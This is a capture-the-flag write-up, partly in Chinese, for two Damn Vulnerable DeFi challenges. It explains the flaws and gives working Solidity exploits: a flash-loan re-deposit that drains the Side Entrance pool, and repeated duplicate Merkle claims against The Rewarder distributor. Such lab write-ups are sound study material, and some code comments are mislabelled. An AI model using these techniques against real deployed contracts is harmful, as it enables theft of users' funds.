# 8.31

# **Side Entrance**

desc

```markdown
# Side Entrance

A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.

It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.

Yoy start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.
```

漏洞函数

```solidity
    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
```

这里的问题是只检测了合约的balance，并没有检测balance是怎么来的，我没可以将flashloan得来的eth再质押进去，最后再通过withdraw得到所有的eth

exp

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
contract SideEntranceExploiter{
    SideEntranceLenderPool public pool;
    address public recovery;
    uint public exploitAmount;
    constructor(address _pool, address _recovery, uint _amount){  
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
        exploitAmount = _amount;
    }
    function attack() external returns(bool){
        uint balanceBefore = address(this).balance;
        pool.flashLoan(exploitAmount);
        pool.withdraw();
        uint balanceAfter = address(this).balance;
        require(balanceAfter > balanceBefore, "Funds has not been transferred!");
        payable(recovery).transfer(exploitAmount);
        return true;
    }
    function execute() external payable{
        pool.deposit{value:msg.value}();
    }
    receive() external payable{}
}
```

```solidity
    function test_sideEntrance() public checkSolvedByPlayer {
        SideEntranceExploiter exploiter = new SideEntranceExploiter(address(pool), recovery, ETHER_IN_POOL);
        require(exploiter.attack());
    }
```

# **The Rewarder**

desc

```markdown
# The Rewarder

A contract is distributing rewards of Damn Valuable Tokens and WETH.

To claim rewards, users must prove they're included in the chosen set of beneficiaries. Don't worry about gas though. The contract has been optimized and allows claiming multiple tokens in the same transaction.

Alice has claimed her rewards already. You can claim yours too! But you've realized there's a critical vulnerability in the contract.

Save as much funds as you can from the distributor. Transfer all recovered assets to the designated recovery account.

```

因为合约是检测到下一个不同的claim的时候才标记上一个claim不合法并继续，如果我们给一系列一样的claim就可以多次获得奖励。

exp

```solidity
function test_theRewarder() public checkSolvedByPlayer {
        uint PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
        uint PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;

        bytes32[] memory dvtLeaves = _loadRewards(
            "/test/the-rewarder/dvt-distribution.json"
        );
        bytes32[] memory wethLeaves = _loadRewards(
            "/test/the-rewarder/weth-distribution.json"
        );

        uint dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT /
            PLAYER_DVT_CLAIM_AMOUNT;
        uint wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT /
            PLAYER_WETH_CLAIM_AMOUNT;
        uint totalTxCount = dvtTxCount + wethTxCount;

        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        // Create Alice's claims
        Claim[] memory claims = new Claim[](totalTxCount);

        for (uint i = 0; i < totalTxCount; i++) {
            if (i < dvtTxCount) {
                claims[i] = Claim({
                    batchNumber: 0, // claim corresponds to first DVT batch
                    amount: PLAYER_DVT_CLAIM_AMOUNT,
                    tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
                    proof: merkle.getProof(dvtLeaves, 188) // Alice's address is at index 2
                });
            } else {
                claims[i] = Claim({
                    batchNumber: 0, // claim corresponds to first DVT batch
                    amount: PLAYER_WETH_CLAIM_AMOUNT,
                    tokenIndex: 1, // claim corresponds to first token in `tokensToClaim` array
                    proof: merkle.getProof(wethLeaves, 188) // Alice's address is at index 2
                });
            }
        }

        distributor.claimRewards({
            inputClaims: claims,
            inputTokens: tokensToClaim
        });

        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }
```